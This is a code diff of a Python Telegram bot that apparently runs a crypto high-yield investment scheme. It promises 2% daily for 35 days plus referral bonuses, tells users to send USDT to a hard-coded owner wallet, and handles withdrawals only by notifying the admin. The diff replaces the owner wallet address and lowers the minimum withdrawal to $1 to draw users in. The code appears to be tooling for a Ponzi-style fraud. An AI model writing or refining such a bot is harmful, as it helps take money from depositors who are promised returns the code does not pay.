@@ -6,7 +6,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # --- Keep Render LIVE ---
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200); self.end_headers(); self.wfile.write(b"Magnet V9 FINAL 2% LIVE")
+        self.send_response(200); self.end_headers(); self.wfile.write(b"Magnet V9 FINAL 2% LIVE - $1 WITHDRAW")
     def log_message(self, *a): pass
 
 def run_server():
@@ -15,7 +15,7 @@ threading.Thread(target=run_server, daemon=True).start()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN","")
 ADMIN_ID = int(os.getenv("ADMIN_ID","7016458590"))
-OWNER_WALLET = os.getenv("OWNER_WALLET","0x79f805319c0ff9b99eaf8a717110e468a496f9d8")
+OWNER_WALLET = os.getenv("OWNER_WALLET","0xCD0Dc238555E212af71346A1DF26D22d92486982")
 DB_FILE = "users.json"
 users = {}
 
@@ -45,7 +45,7 @@ VIP5 $25 → $50
 
 💰 Earning: 2% Daily for 35 Days
 ✅ Deposit AUTO
-💸 Withdraw Manual 1% Min $2
+💸 Withdraw Manual 1% Min $1
 👥 Referral 5%"""
 
 def main_kb():
@@ -65,7 +65,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if uid not in users[ref]["refs"]:
                 users[ref]["refs"].append(uid); users[ref]["balance"]+=0.5
     save_db()
-    await update.message.reply_text(f"🔥 Welcome Boss! Balance: ${round(u['balance'],2)}\nInvest min $5 - 2% daily 35 days\n\n💼 Wallet:\n`{OWNER_WALLET}`\n\n{PLANS}", parse_mode="Markdown", reply_markup=main_kb())
+    await update.message.reply_text(f"🔥 Welcome Boss! Balance: ${round(u['balance'],2)}\nInvest min $5 - 2% daily 35 days\n\n💼 Wallet BEP20 USDT:\n`{OWNER_WALLET}`\n\n{PLANS}", parse_mode="Markdown", reply_markup=main_kb())
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id!= ADMIN_ID:
@@ -88,10 +88,10 @@ async def btn(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q=update.callback_query; await q.answer()
     uid=str(q.from_user.id); u=get_user(uid); d=q.data
     if d=="balance": await q.edit_message_text(f"💵 Balance: ${round(u['balance'],2)}\nEarning 2% Daily", reply_markup=main_kb())
-    elif d=="deposit": await q.edit_message_text(f"💰 Deposit AUTO BEP20\nSend BNB to:\n`{OWNER_WALLET}`\n\nMin $5", parse_mode="Markdown", reply_markup=main_kb())
+    elif d=="deposit": await q.edit_message_text(f"💰 Deposit AUTO BEP20 USDT\nSend USDT (BEP20) to:\n`{OWNER_WALLET}`\n\nMin $5", parse_mode="Markdown", reply_markup=main_kb())
     elif d=="plans": await q.edit_message_text(PLANS, reply_markup=main_kb())
     elif d=="invest": await q.edit_message_text(f"📊 Invest - 2% Daily\nWallet:\n`{OWNER_WALLET}`\n\nYour Bal: ${round(u['balance'],2)}\n\nType: Invest 5 (Min $5)\nVIP1 $5 VIP2 $10 VIP3 $15 VIP4 $20 VIP5 $25", parse_mode="Markdown", reply_markup=main_kb())
-    elif d=="withdraw": await q.edit_message_text(f"💸 Withdraw Manual 1% Min $2\nBal ${round(u['balance'],2)}\nType: Withdraw 2", reply_markup=main_kb())
+    elif d=="withdraw": await q.edit_message_text(f"💸 Withdraw Manual 1% Min $1\nBal ${round(u['balance'],2)}\nType: Withdraw 1", reply_markup=main_kb())
     elif d=="referral":
         link=f"https://t.me/{context.bot.username}?start={uid}"
         await q.edit_message_text(f"👥 Referral 5%\nLink: {link}\nRefs {len(u.get('refs',[]))}", reply_markup=main_kb())
@@ -115,13 +115,13 @@ async def msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif low.startswith("withdraw"):
         try:
             amt=float(t.split()[1])
-            if amt<2: await update.message.reply_text("Min $2"); return
+            if amt<1: await update.message.reply_text("Min $1"); return
             fee=amt*0.01
             if u["balance"]<amt+fee: await update.message.reply_text(f"Need ${amt+fee} you have ${round(u['balance'],2)}"); return
             u["balance"]-=amt+fee; save_db()
             await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 WITHDRAW User {uid} Amount ${amt} Fee ${fee}")
             await update.message.reply_text(f"✅ Withdraw ${amt} requested Fee 1% ${fee}")
-        except: await update.message.reply_text("Use: Withdraw 2")
+        except: await update.message.reply_text("Use: Withdraw 1")
 
 async def daily(context: ContextTypes.DEFAULT_TYPE):
     for uid in list(users.keys()):
